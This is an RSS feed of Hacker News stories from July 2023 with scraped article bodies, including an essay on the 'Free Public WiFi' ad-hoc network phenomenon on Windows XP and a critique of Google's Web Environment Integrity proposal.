<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 31 Jul 2023 07:00:05 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[SEC asked Coinbase to halt trading for everything except Bitcoin (FT) (101 pts)]]></title>
            <link>https://www.ft.com/content/1f873dd5-df8f-4cfc-bb21-ef83ed11fb4d</link>
            <guid>36938785</guid>
            <pubDate>Mon, 31 Jul 2023 04:23:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ft.com/content/1f873dd5-df8f-4cfc-bb21-ef83ed11fb4d">https://www.ft.com/content/1f873dd5-df8f-4cfc-bb21-ef83ed11fb4d</a>, See on <a href="https://news.ycombinator.com/item?id=36938785">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="article-trial-barrier">
<div id="site-content" data-trackable="trial-barrier-grid" data-barrier="trial" data-barrier-is-sandbox="false">
	<div>
				<div data-o-grid-colspan="12 L6">
							<h2>
								Leverage our market expertise
							</h2>
						<div>
								<p>
				Expert insights, analysis and smart data help you cut through the noise to spot trends,
				risks and opportunities.
			</p>
			<p>Join over 300,000 Finance professionals who already subscribe to the FT.</p>
						</div>
					</div>
				<p><img src="https://www.ft.com/__assets/creatives/product/dynamic-barriers/markets.jpg" alt="">
				</p>
			</div>
	<div>
				<p><img src="https://www.ft.com/__assets/creatives/optimizely/MAR090/key_icon.svg" alt="Unlock article">
					<span>Subscribe to unlock this article</span>
				</p>
			</div>
	<div>
			<div data-o-component="o-subs-card" data-offer-id="41218b9e-c8ae-c934-43ad-71b13fcb4465" data-offer-prominence="primary" data-offer-title="Trial" data-tracking-context="{&quot;title&quot;:&quot;Trial&quot;,&quot;brief&quot;:&quot;Try full digital access and see why over 1 million readers subscribe to the FT&quot;,&quot;offerId&quot;:&quot;41218b9e-c8ae-c934-43ad-71b13fcb4465&quot;,&quot;price&quot;:&quot;$1 for 4 weeks&quot;,&quot;prominence&quot;:&quot;primary&quot;,&quot;skuIds&quot;:[],&quot;description&quot;:&quot;For 4 weeks receive unlimited Premium digital access to the FT's trusted, award-winning business news&quot;}">
					<h3>Try unlimited access</h3>

					<p>Try full digital access and see why over 1 million readers subscribe to the FT</p><p>Only
						CHF&nbsp;1 for 4 weeks
				</p>

					

				</div>
			<p>
				<h4>Explore our subscriptions</h4>
			</p>
			<div>
					<h5>Individual</h5>
					<p>Find the plan that suits you best.</p>
					
				</div>
			<div>
					<h5>Professional</h5>
					<p>Premium access for businesses and educational institutions.</p>
					
				</div>
		</div>
</div>

		<div data-o-component="o-cookie-message" role="dialog" aria-labelledby="cookie-banner-aria-label" aria-describedby="cookie-banner-aria-description" data-n-messaging-slot="bottom" data-n-messaging-name="cookieConsentC" data-trackable="onsite-message-cookieConsentC" data-n-messaging-tooltip="">
							<p>
								<h2 id="cookie-banner-aria-label">Cookies on FT Sites</h2>
							</p>
							<p id="cookie-banner-aria-description">
								We use
								<a href="http://help.ft.com/help/legal-privacy/cookies/" target="_blank" rel="noopener" data-n-messaging-policy="">cookies</a>
								and other data for a number of reasons, such as keeping FT Sites reliable and secure,
								personalising content and ads, providing social media features and to
								analyse how our Sites are used.
							</p>
						</div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Conduit: Simple, fast and reliable chat server powered by Matrix (182 pts)]]></title>
            <link>https://conduit.rs/</link>
            <guid>36937713</guid>
            <pubDate>Mon, 31 Jul 2023 00:51:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://conduit.rs/">https://conduit.rs/</a>, See on <a href="https://news.ycombinator.com/item?id=36937713">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="features">
            
            <blockquote>
<p>Note: This project is beta. It can be used already, but is missing some smaller features.</p>
</blockquote>
<h2 id="what-is-matrix">What is Matrix?</h2>
<p><a href="https://matrix.org/">Matrix</a> is an open network for secure and decentralized
communication. Users from every Matrix homeserver can chat with users from all
other Matrix servers. You can even use bridges to communicate with users outside
of Matrix, like a community on Discord.</p>
<h2 id="why-conduit">Why Conduit?</h2>
<p>Conduit is a lightweight open-source server implementation of the <a href="https://matrix.org/docs/spec">Matrix
Specification</a> with a focus on easy setup and low
system requirements. That means you can make your own Conduit setup in just
a few minutes.</p>
<p>Conduit keeps things simple, it's a single binary with an embedded database and
can be much faster than other server implementations in some cases.</p>
<h2 id="links">Links</h2>
<p>Website: <a href="https://conduit.rs/">https://conduit.rs</a><br>
Git and Documentation: <a href="https://gitlab.com/famedly/conduit">https://gitlab.com/famedly/conduit</a><br>
Chat with us: <a href="https://matrix.to/#/#conduit:fachschaften.org">#conduit:fachschaften.org</a></p>
<h2 id="donate">Donate</h2>
<p>Liberapay: <a href="https://liberapay.com/timokoesters/">https://liberapay.com/timokoesters/</a><br>
Bitcoin: <code>bc1qnnykf986tw49ur7wx9rpw2tevpsztvar5x8w4n</code></p>
<p>Server hosting for <code>conduit.rs</code> provided by the Matrix.org Foundation.</p>
<p>Conduit was sponsored by German BMBF for 6 months in 2021. FKZ: 01lS21S11</p>
<p><img src="https://conduit.rs/BMBF_gefoerdert_2017_en.jpg">

            
        </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Screwed-O-Meter (193 pts)]]></title>
            <link>https://rachelbythebay.com/fun/som/</link>
            <guid>36937658</guid>
            <pubDate>Mon, 31 Jul 2023 00:43:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://rachelbythebay.com/fun/som/">https://rachelbythebay.com/fun/som/</a>, See on <a href="https://news.ycombinator.com/item?id=36937658">Hacker News</a></p>
Couldn't get https://rachelbythebay.com/fun/som/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Mac Mouse Fix (118 pts)]]></title>
            <link>https://mousefix.org/</link>
            <guid>36937593</guid>
            <pubDate>Mon, 31 Jul 2023 00:34:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mousefix.org/">https://mousefix.org/</a>, See on <a href="https://news.ycombinator.com/item?id=36937593">Hacker News</a></p>
<div id="readability-page-1" class="page">

        <div>

            
            <p>If you have problems opening the app, click <a href="https://github.com/noah-nuebling/mac-mouse-fix/discussions/114">here</a>.
            </p>


            <!-- Title -->
            <p><img src="https://mousefix.org/resources/app_icon_round.png" alt="Mac Mouse Fix Icon">
            </p>
            <div>
                
                

                <h3>A simple way to make your mouse better.</h3>
                <p><img src="https://mousefix.org/resources/chevron-down.svg" alt="Scroll down for more">
            </p></div>

        </div>

        <!-- content -->

        <section id="graySec1">
            <h2>
                Do the things you do on a<span> trackpad</span>.<br><span>Without</span> a<span> trackpad</span>.
            </h2>
            <p>
                <span>Switch between Spaces, activate Mission Control, reveal the Desktop, trigger Quick Look, or use the side buttons to </span>
                <span>navigate through pages in your browser. All of that and more. Right from your mouse.</span>
            </p>
            

        </section>

        <h2>
            <span>Smooth </span>and <span>Responsive </span>scrolling.
        </h2>
        <p>
            Experience a refined, friction based scrolling algorithm which strikes a perfect balance between fluidity and control.
            <br>Allows you to change mouse scrolling direction independently of trackpad scrolling direction.
        </p>
        

        <div>

                <h2>
                    <span>Unobtrusive </span>and <span>Light Weight</span>.
                </h2>
                <p>
                    You won't notice Mac Mouse Fix, except in your Applications Folder, and of course when using your mouse.
                </p>
                <p><img id="pic1" src="https://mousefix.org/resources/applications.png" alt="Applications Folder Screenshot">
                </p>

            </div>


        <!-- footer -->

        

    
    










































</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Free Public WiFi (123 pts)]]></title>
            <link>https://computer.rip/2023-07-29-Free-Public-WiFi.html</link>
            <guid>36937571</guid>
            <pubDate>Mon, 31 Jul 2023 00:30:43 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://computer.rip/2023-07-29-Free-Public-WiFi.html">https://computer.rip/2023-07-29-Free-Public-WiFi.html</a>, See on <a href="https://news.ycombinator.com/item?id=36937571">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
<h2>&gt;&gt;&gt; 2023-07-29 Free Public WiFi</h2>

<p>Remember Free Public WiFi?</p>
<p>Once, many years ago, I stayed on the 62nd floor of the Westin Peachtree Plaza
in Atlanta, Georgia. This was in the age when the price of a hotel room was
directly correlated with the price of the WiFi service, and as a high school
student I was not prepared to pay in excess of $15 a day for the internet. As I
remember, a Motel 6 that was not blocks away but within line of sight ended up
filling the role. But even up there, 62 floors from the ground, there was false
promise: Free Public WiFi.</p>
<p>I am not the first person to write on this phenomenon, I think I originally
came to understand it as a result of a 2010 segment of <em>All Things Considered</em>.
For a period of a few years, almost everywhere you went, there was a WiFi
network called "Free Public WiFi." While it was both free and public in the
most literal sense, it did not offer internet access. It was totally useless,
and fell somewhere between a joke, a scam, and an accident of history. Since
I'm not the first to write about it, I have to be the most thorough, and so
let's start out with a discussion of WiFi itself.</p>
<p>The mid-2000s were a coming of age era for WiFi. It had become ubiquitous in
laptops, and the 2007 launch of the iPhone established WiFi as a feature of
mobile devices (yes, various phones had offered WiFi support earlier, but none
sold nearly as well). Yet there weren't always that many networks out there.
Today, it seems that it has actually become less common for cafes to offer WiFi
again, presumably as LTE has reached nearly all cafe customers and fewer people
carry laptops. But in the 2010s, genuinely free, public WiFi had become far
more available in US cities.</p>
<p>Some particularly ambitious cities launched wide-area WiFi programs, and for a
brief time "Municipal WiFi" was a market sector. Portland, where I grew up, was
one of these, with a wide-area WiFi network covering the house I grew up in for
a couple of years. Like most the program didn't survive to see 2020.
Ironically, efforts to address the "digital divide" have lead to a partial
renaissance of municipal WiFi. Many cities now advertise free WiFi service at
parks, libraries, and other public places. I was pleased to see that Mexico
City has a relatively expansive municipal WiFi service, probably taking
advantage of the municipal IP network they have built out for video
surveillance and emergency phones.</p>
<p>The 2000s, though, were different. "Is there WiFi here?" was the sort of
question you heard all the time in the background. WiFi was seen as a revenue
source (less common today, although the hotel industry certainly still has its
holdouts) and so facility-offered WiFi was often costly. A surprising number of
US airports, for example, had either no WiFi or only a paid service even
through the 2010s. I'm sure there are still some like this today, but paid WiFi
seems on the way out [1], probably as a result of the strong competition it
gets from LTE and 5G. The point, though, is that back in 2006 we were all
hungry for WiFi all the time.</p>
<p>We also have to understand that the 802.11 protocol that underlies WiFi is
surprisingly complex and offers various different modes. We deal with this less
today, but in the 2000s it was part of computer user consciousness that WiFi
came in two distinct flavors. 802.11 beacon packets, used to advertise WiFi
networks to nearby devices, include a flag that indicates whether the network
operates in <em>infrastructure mode</em> or <em>ad-hoc mode</em>.</p>
<p>A network in infrastructure mode, basically the normal case, requires all
clients to communicate with the access point (AP). When two clients exchange
traffic, the AP serves as an intermediary, receiving packets from one device
and transmitting them to the other. This might at first seem inefficient, but
this kind of centralization is very common in radio systems as it offers a
simple solution to a complex problem. If a WiFi network consists of three
devices, an AP and two clients (A and B), we know that clients A and B can
communicate with the AP because they are maintaining an association. We don't
know if A and B can communicate with each other. They may be on far opposite
sides of the AP's range, there may be a thick concrete wall between A and B,
one device may have very weak transmit power, etc. Sending all traffic through
the AP solves this problem the same way a traditional radio repeater does, by
serving as an intermediary that is (by definition for an AP) well-positioned in
the network coverage area.</p>
<p>The other basic WiFi mode is the ad-hoc network. In an ad-hoc network, devices
communicate directly with each other. The main advantage of an ad-hoc network
is that no AP is required. This allowed me and a high school friend to
communicate via UnrealIRCd running on one of our laptops during our
particularly engaging US Government/Economics class (we called this
"Governomics"). The main disadvantage of ad-hoc networks is that the loss of a
central communications point makes setup and routing vastly more complicated.
Today, there is a much better established set of technologies for distributed
routing in mesh networks, and yet ad-hoc WiFi is still rare. In the 2000s it
was much worse; ad-hoc mode was basically unusable by anyone not ready to
perform manual IP address management (yes, link local addresses existed and we
even used them for our IRC client configurations, but most people evidently
found these more confusing than helpful).</p>
<p>In general, ad-hoc networks are a bit of a forgotten backwater of consumer WiFi
technology. At the same time, the promise of ad-hoc networks featured heavily
in marketing around WiFi, compelling vendors to offer a clear route to creating
and joining them. This has allowed some weird behaviors to hang around in WiFi
implementations.</p>
<p>Another thing about WiFi networks in the 2000s, and I swear this is all
building to a point, is that the software tools for connecting to them were not
very good. On Windows, WiFi adapter vendors distributed their own software.
Anyone with a Windows laptop in, say, 2005 probably remembers Dell QuickSet
Wireless, Intel PROSet/Wireless (this actually how they style the name), and
Broadcom WLAN Utility. The main thing that these vendor-supported wireless
configuration utilities shared was an astounding lack of quality control, even
by the standards of the time. They were all terrible: bizarre, intrusive,
over-branded UX on top of a network configuration framework that had probably
never worked reliably, even in the original developer's test environment.</p>
<p>Perhaps realizing that this hellscape of software from hardware companies was
undoubtedly having a negative impact on consumer perception of Windows [2],
Microsoft creaked into action. Well, this part is kind of confusing, in a
classically Microsoft way. Windows XP had a built-in wireless configuration
management utility from the start, called Wireless Zero Configuration. The most
irritating thing about the vendor utilities was that they were unnecessary;
most of the time you could just uninstall them and use Wireless Zero and
everything would work fine.</p>
<p>Wireless Zero was the superior software too, perhaps because it had fewer
features and was designed by someone with more of the perspective of a computer
user than a wireless networking engineer. Maybe I'm looking on Wireless Zero
with rose-colored glasses but my recollection is that several people I knew
sincerely struggled to use WiFi. The fix was to remove whatever garbage their
network adapter vendor had provided and show them Wireless Zero, where
connecting to a network meant clicking on it in a list rather than going
through a five-step wizard.</p>
<p>So why did the vendor utilities even exist? Mostly, I think, because of the
incredible urge PC vendors have to "add value."
<a href="https://www.youtube.com/@CathodeRayDude">Gravis</a>, in the context of "quick
start" operating systems, gives a good explanation of this phenomenon. The
problem with being a PC vendor is that all of the products on the market offer
a mostly identical experience. For vendors to get any competitive moat bigger
than loud industrial design (remember when you badly wanted a Vaio for the
looks?), they had to "add value" by bolting on something they had developed
internally. These value-adds were, almost without exception, worthless
garbage. And wireless configuration utilities were just another example, a way
for Intel to put their brand in front of your face (seemingly the main concern
of Intel R&amp;D to this day) despite doing the same thing everyone else did.</p>
<p>There was a second reason, as well. While it was a good fit for typical
consumer use, Wireless Zero was not as feature-complete as many of the vendor
utilities were. Until the release of Vista and SP3, Wireless Zero was basically
its own proprietary solution just like the vendor utilities. There was no
standard API to interact with wireless configuration on XP/SP1/2, so if a
vendor wanted to offer anything Zero couldn't do, they had to ship their whole
own Product. Microsoft's introduction of a WiFi config API in Vista (and
basically backporting it to SP3) was a big blow to proprietary wireless
utilities, but it probably had less of an impact than the general decline of
crapware in Vista and later.</p>
<p>This is not to say that they're gone. A surprising number of PCs still ship
with some kind of inane OEM software suite that offers a half-baked wireless
configuration utility (just a frontend on the Windows API) alongside the
world's worst backup service, a free trial offer for a streaming service you
haven't heard of but represents the death throes of a once great national cable
network, and something that tells you if your PC is "healthy" based on
something about the registry that has never and will never impact your life???
God how is the PC industry <em>still</em> like this [3].</p>
<p>I think I have adequately set the stage for our featured story. In the late
2000s, huge numbers of people were (a) desperately looking for a working WiFi
network even though they were in a place like an airport that should clearly,
by civilized standards, have a free one; (b) using Wireless Zero on XP/SP1/2;
and (c) in possession of only a vague understanding of ad-hoc networks which
were nonetheless actively encouraged by WiFi vendors and their software.</p>
<p>Oh, there is a final ingredient: Wireless Zero had an interesting behavior
around ad-hoc networks. It's the kind of thing that sounds like an incredibly
bad decision in retrospect, but I can see how Microsoft got there. Let's say
that, for some reason and some how, a consumer uses ad-hoc WiFi. It was
ostensibly possible, not even really that hard, to use ad-hoc WiFi to provide
internet access in a home (from e.g. a USB DSL modem, still common at the
time). It's just that the boxes you had to check were enough clicks deep in the
network control panel that I doubt many people ever got there.</p>
<p>One of the problems with ad-hoc WiFi, though, is that ad-hoc networks can be
annoying to join. You've got to enter the SSID and key, which is already bad
enough, but then you're going to be asked if it's WEP or WPA or WPA2 and then,
insult on injury, if the WPA2 is in TKIP or AES mode. For ad-hoc networks to be
usable <em>something</em> had to broadcast beacons, and without an AP, that had to be
the first computer in the network.</p>
<p>So, now that you have your working ad-hoc setup complete with beacons, you
might want to take your laptop, unplug it from the DSL modem, and take it
somewhere else. Maybe you go on a trip, use the WiFi at a hotel (probably $15 a
day depending on your <em>WORLD OF HYATT</em> status), then come back home and plug
things back in the way they were. You would expect your home internet setup to
pick up where you left off, but people didn't have as many devices back then
and especially not as many always-on. Your laptop, de facto "host" of the
ad-hoc network, may be the only network participant up and running when you
want to connect a new device. So what does it need to do? Transmit beacons
again, even though the network configuration has changed a few times.</p>
<p>The problem is that it's really hard for a system in an ad-hoc network to know
whether or not it should advertise it. Wireless Zero didn't really provide any
way to surface this decision to the user, and the user probably wouldn't have
understood what it meant anyway. So Microsoft took what probably seemed, in the
naivety of the day, to be a reasonable approach: once a Windows XP machine had
connected to an ad-hoc network, it "remembered" it the same way it did the
"favorite" networks, for automatic reconnection. Assuming that it might just be
the first device in the ad-hoc network to come up, if the machine had a
remembered ad-hoc network and wasn't associated with anything else, it would
transmit beacons.</p>
<p>Put another way, this behavior sounds far more problematic: if a Windows XP
machine had an ad-hoc network favorited (which would be default if it had ever
connected to one), then when it wasn't connected to any other WiFi network, it
would beacon the favorited ad-hoc network to make it easier for other hosts to
connect. Ad-hoc networks could get <em>stuck in there,</em> a ghost in Wireless Zero.</p>
<p>You can no doubt see where this goes. "Free Public WiFi" was just some ad-hoc
network that someone created once. We don't know why; most people seem to go to
ill intent but I don't think that's necessary. Maybe some well-meaning cafe
owner had an old computer with a USB DSL modem they used for Business and
decided to offer cafe WiFi with the hardware they already owned. The easiest
way (and probably only way, given that driver support for infrastructure mode
AP behavior on computer WiFi adapters remains uneven today) would be to create
an ad-hoc network and check the right boxes to enable forwarding. But who knows,
maybe it was someone intercepting traffic for malicious purposes, maybe it was
someone playing a joke, all we really know is that it happened sometime before
2006 when I find the first public reference to the phenomenon.</p>
<p>Whoever it was, they were patient zero. The first Windows XP machine to connect
became infected, and when its owner took it somewhere else and didn't connect
to a WiFi network, it helpfully beaconed Free Public WiFi. Someone else, seeing
such a promising network name, connected. Frustrated by the lack of Hotmail
access, they disconnected and moved on... but, unknowingly, they were now part
of The Ad-Hoc Network.</p>
<p>The phenomenon must have spread quickly. In 2007, a wire service column of
security tips (attributed to the Better Business Bureau, noted information
security experts) warns that "this network may be an ad-hoc network used by
hackers hunting for credit card information, Social Security numbers and
account passwords." Maybe! Stranger things have happened! I would put good
money on "no" (the same article encourages using a VPN, an early link in a
chain that leads to the worst YouTube content today).</p>
<p>By 2008-2009, when I think I had reached a high level of owning a laptop and
using it in strange places, it was almost universal. "Free Public WiFi"
enchanted me as a teenager because it was <em>everywhere.</em> I could hardly open my
laptop without seeing it there in the Wireless Zero list. Like the Morris worm,
it exploited a behavior so widespread and so unprotected that I think it must
have burned through a substantial portion of the Windows XP laptop fleet.</p>
<p>"Free Public WiFi" would reach an end. In Service Pack 3, as part of the
introduction of the new WLAN framework, Microsoft fixed the beacon behavior.
This was before the era of forced updates, though, and XP was particularly
notorious for slow uptake of service packs. "Free Public WiFi" was apparently
still widespread in 2010 when NPR's mention inspired a wave of news coverage.
Anecdotally, I think I remember seeing it into 2012. One wonders: is it still
around today?</p>
<p>Unfortunately, I always have a hard time with large-scale research on WiFi
networks. WiGLE makes a tantalizing offer of an open data set to answer this
kind of question but the query interface is much too limited and the API has a
prohibitively low quota. Maxing out my API limits every day I think it'd take
over a month to extract all the "Free Public WiFi" records so that I could
filter them the way I want to. Perhaps I should make a sales inquiry for a
commercial account for my enterprise blogging needs, but it's just never felt
to me like WiGLE is actually a good resource for the security community.
They're kind of like hoarders, they have an incredible wealth of data but they
don't want to give any of it up.</p>
<p>I pulled the few thousand records I'm allowed to get today from WiGLE and then
changed tracks to WifiDB, which is much less known than WiGLE but actually
makes the data available. Unfortunately WifiDB has a much lower user count, and
so the data is clearly impacted by collection bias (namely the impressive work
of one specific contributor in Phoenix, AZ).</p>
<p>Still, I can find instances of ad-hoc "Free Public WiFi" spanning 2006 to as
late as 2018! It's hard to know what's going on there. I would seriously
consider beaconing "Free Public WiFi" today as a joke, but it may be that in
2018 there was still some XP SP2 laptop in the Phoenix area desperately hoping
for internet access.</p>
<p>WifiDB data, limited though it is, suggests that The Ad-Hoc Network peaked in
2010. Why not a crude visualization?</p>
<pre><code>2006    1   |
2007    0   
2008    39  |||||
2009    82  |||||||||
2010    93  ||||||||||
2011    20  |||
2012    2   |
2013    0
2014    1   |
2015    5   ||
2016    3   |
2017    2   |
2018    1   |
</code></pre>
<p>That 2006 detection is the first, which lines up with NPR's reporting, but
could easily also be an artifact of WifiDB's collection. And 2018! The long
tail on this is impressive, but not all that surprising. XP had a real
reputation for its staying power. There are surely still people out there that
hold that XP was the last truly good Windows release---and honestly I might be
one of them. Every end-of-life announcement for XP triggered a wave of
complaints in the industry rags. In 2018, some niche versions of XP (e.g.
POSReady) were still under security support!</p>
<p>Most recent observations of "Free Public WiFi" are actually infrastructure-mode
networks. It's an amusing outcome that "Free Public WiFi" has been legitimized
over time. In Bloomington, Indiana I think it's actually the public WiFi at a
government building. Some office buildings and gas stations make appearances.
"Free Public WiFi" is probably more likely to work today than not... but no
guarantee that it won't steal your credit card. Pay heed to the Better Business
Bureau and take caution. Consider using a VPN... how about a word from our
sponsor?</p>
<p>Postscript: I have been uploading some YouTube videos! None of them are good,
but <a href="https://www.youtube.com/channel/UCOtVj3FON727juFaSDEZUXw">check it out</a>.
I'm about to record another one, about burglar alarms.</p>
<p>[1] Paid WiFi still seems alive and well at truck stops. Circumstances on a
recent cross-country trip lead to me paying an outrageous sum, something like
$20, for one day of access to a nationwide truck stop WiFi service that was
somewhere between "completely broken" and "barely usable to send an email" at
the three successive TAs I tried at. My original goal of downloading a
several-GiB file was eventually achieved by eating at a restaurant proximate to
a Motel 6. Motel 6 may be the nation's leading municipal WiFi operator.</p>
<p>[2] Can we think of another set of powerful hardware vendors consistently
dragging down the (already questionably seaworthy) Windows ecosystem by
shipping just absolute trash software that's mandatory for full use of their
hardware? Companies that are considered major centers of computer innovation
yet distribute a "driver" as an installer for an installer that takes over a
minute just to install the installer? Someone with the gall to call their
<em>somehow even less stable</em> release branch "ADRENALINE EDITION"?</p>
<p>[3] I used to have a ThinkPad with an extra button that did nothing because
Lenovo decided not to support the utility that made it do things on Vista or
later. This laptop was sold well after the release of Vista and I think shipped
with 7. That situation existed on certain ThinkPad models for <em>two
generations.</em> Things like this drive you to the edge of the Apple Store I
swear, and Lenovo isn't as bad as some.</p>
	</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CloudFlares last Warrant Canary was published over a year ago (198 pts)]]></title>
            <link>https://www.cloudflare.com/learning/privacy/what-is-warrant-canary/</link>
            <guid>36937413</guid>
            <pubDate>Mon, 31 Jul 2023 00:06:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cloudflare.com/learning/privacy/what-is-warrant-canary/">https://www.cloudflare.com/learning/privacy/what-is-warrant-canary/</a>, See on <a href="https://news.ycombinator.com/item?id=36937413">Hacker News</a></p>
Couldn't get https://www.cloudflare.com/learning/privacy/what-is-warrant-canary/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[The Right to Lie and Google’s “Web Environment Integrity” (188 pts)]]></title>
            <link>https://rants.org/2023/07/the-right-to-lie-and-google-wei/</link>
            <guid>36935843</guid>
            <pubDate>Sun, 30 Jul 2023 20:53:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://rants.org/2023/07/the-right-to-lie-and-google-wei/">https://rants.org/2023/07/the-right-to-lie-and-google-wei/</a>, See on <a href="https://news.ycombinator.com/item?id=36935843">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main" role="main">

		
<article id="post-3187">

		<!-- .entry-header -->

	<div>

		<div>
<figure><a href="https://rants.org/wp-content/uploads/2023/07/truth-270x270-1.png"><img decoding="async" width="270" height="270" src="https://rants.org/wp-content/uploads/2023/07/truth-270x270-1.png" alt="" srcset="https://rants.org/wp-content/uploads/2023/07/truth-270x270-1.png 270w, https://rants.org/wp-content/uploads/2023/07/truth-270x270-1-150x150.png 150w" sizes="(max-width: 270px) 100vw, 270px"></a></figure></div>


<p>If your computer can’t lie to other computers, then it’s not yours.</p>



<p>This is a fundamental principle of free and open source software. The World Wide Web abides by this principle, although we don’t often think of it that way. The Web is just an agreed-on set of programmatic interfaces: if you send me this, I’ll send you that. Your computer can construct the “this” by whatever means it wants; it’s none of the other side’s business, because your computer is not their computer.</p>



<p>Google’s so-called “Web Environment Integrity” <a href="https://en.wikipedia.org/wiki/Web_Environment_Integrity">plan</a> would destroy this independence. “Integrity” is exactly the wrong word for it — a better name would be the “Browser Environment Control” plan.</p>



<p>In the normal world, you show up at the store with a five dollar bill, pick up a newspaper, and the store sells you the newspaper (and maybe some change) in exchange for the bill. In Google’s proposed world, five dollar bills aren’t fungible anymore: the store can ask you about the provenance of that bill, and if they don’t like the answer, they don’t sell you the newspaper. No, they’re not worried about the bill being fake or counterfeit or anything like that. It’s a real five dollar bill, they agree, but you can’t prove that you got it from the right bank. Please feel free to come back with the <em>right sort</em> of five dollar bill.</p>



<p>This is not the Open Web that made what’s best about the Internet accessible to the whole world. On that Web, if you send a valid request with the right data, you get a valid response. How you produced the request is <em>your business</em> and your business alone. That’s what software freedom is all about: you decide how your machinery works, just as other people decide how their machinery works. If your machine and their machine want to talk to each other, they just need an agreed-on language (in the case of the Web, that’s HTTP) in which to do so.</p>



<p>Google’s plan, though, steps behind this standard language to demand something no free and open source software can ever deliver: a magical guarantee that the user has not privately configured their own computer in any way that Google disapproves of.</p>



<p>The effrontery is shocking, to those with enough technical background to understand what is being proposed. It’s as though Google were demanding that when you’re talking to them you must somehow guarantee, in a provable way, that you’re not also thinking impure thoughts.</p>



<p>How could anyone ever agree to this nonsense? Must all our computers become North Korea?</p>



<p>The details of your own system’s configuration are irrelevant to — and unnecessary to accurately represent in — your communications with a server, just as your private thoughts are not required to be included, in some side-band channel, along with everything you say in regular language.</p>



<p>If a web site wants to require that you have a username and password, that’s fine. Those are just a standard part of the HTTP request your browser sends. But if a web site wants your browser to promise that it stores that username and password locally in a file named “google-seekritz.txt”, that’s not only weird and creepy, it’s also something that a free software (as in libre) browser can never reliably attest to. Any browser maintenance team worth its salt will just ship the browser with a default configuration in which the software reports that to Google when asked while, behind the scenes, storing usernames and passwords however it damn well pleases.</p>



<p>Indeed, the fundamental issue here is the freedom to <em>have</em> a “behind the scenes” at all. Environments in which people aren’t allowed to have a “behind the scenes” are totalitarian environments. That’s not an exaggeration; it’s simply the definition of the term. Whatever bad connotations the concept of totalitarianism may have for you, they come not from the fancy-sounding multi-syllabic word but from the actual, human-level badness of the scenario itself. That scenario is what Google is asking for.</p>



<p>My web browser (currently <a href="https://www.mozilla.org/firefox">Mozilla Firefox</a> running on <a href="https://www.debian.org/">Debian GNU/Linux</a>, thank you very much) will never cooperate with this bizarre and misguided proposal. And along with the rest of the free software community, I will continue working to ensure we all live in a world where your web browser doesn’t have to either.</p>



<hr>



<p><em>I <a href="https://kfogel.org/notice/AYCSZYFEXBkLjDLvkm">cross-posted the above in the Fediverse</a>, and a friend of mine there asked how Google’s proposal was different from CORS: “i’m sure that i don’t understand the google proposal, but all the browsers enforce CORS, and don’t let you load data in many contexts.”  It’s very different from CORS and other similar browser-side protections, so I <a href="https://kfogel.org/notice/AYE8S8sMqZd6Folbhw">replied</a> to explain why:</em></p>



<hr>



<p>This is not about the browser enforcing something by default for the purpose of being able to make security guarantees to its user. After all, if you wanted to modify and recompile your browser to not enforce same-origin policies, you could do so. (It would a bad idea, of course, but that’s not a software freedom issue 🙂 .)</p>



<p>Rather, this is about the browser being able to pass back a partially-hardware-based, cryptographically secure token that attests, to a central service, that you (the owner of the computer) have not made certain system modifications <em>that would otherwise be invisible to and undetectable by</em> another computer that you’re interacting with over the network. The central service can then pass that attestation along to relying parties. Those relying parties would then use it for all the expected purposes. For example, if they’re considering sending you a stream of video, they’d only do so if they see a promise from your computer that it has no side-band ability to save the video stream to a file (from which you could view it again later without their knowledge). And this promise would be dependable! Under this proposal, your computer would only be able to say it if it were true.</p>



<p>Of course, by definition the only way such a system can work is if it does not have software freedom on the client side. It requires a cooperative relationship between the hardware manufacturer and the supplier of the software – cross-signed blobs and such – whereby your computer loses the physical ability to make the requested attestation to a third party unless your computer is in fact fully cooperating.</p>



<p>By analogy: right now, you can tell your browser to change its <code>User-Agent</code> string to anything you want. You might get weird effects from doing that, depending on what value you set it to (and it’s unfortunate that web developers let sites get so sensitized to <code>User-Agent</code>, but that’s another story, to be told along with a similar complaint about <code>HTTP Referer</code> – but I digress).</p>



<p>Now imagine a world in which, if you change your <code>User-Agent</code> string, your browser suddenly starts always sending out an extra header: “<code>User-Agent-String-Modified-By-User: True</code>” – and you have <em>no</em> choice about this. You can’t stop your browser from doing it, because your computer won’t let you.</p>



<p>Does this help clarify what the problem is?</p>

		
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article>

<!-- #comments -->
		
		</div><div id="latestPosts">
			<h2>Latest posts</h2>
			<div id="post-wrapper">
				
				
				
					
<div>

	<article id="post-3172">
 
		<!-- .entry-header -->

		<div>
			<p>I just wrote a thing in Emacs that others might find useful: Although the code’s documentation gives a short example,</p>
			
			<p><a href="https://rants.org/2023/01/count-fold-lines/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
<div>

	<article id="post-3007">
 
		<!-- .entry-header -->

		<div>
			<p>The number twelve is a lie; I just wanted to hook you. More than a year ago, my friend Jim</p>
			
			<p><a href="https://rants.org/2022/11/music-for-jim/">Continue reading</a>

				</p></div><!-- .entry-content -->

	</article>


</div>
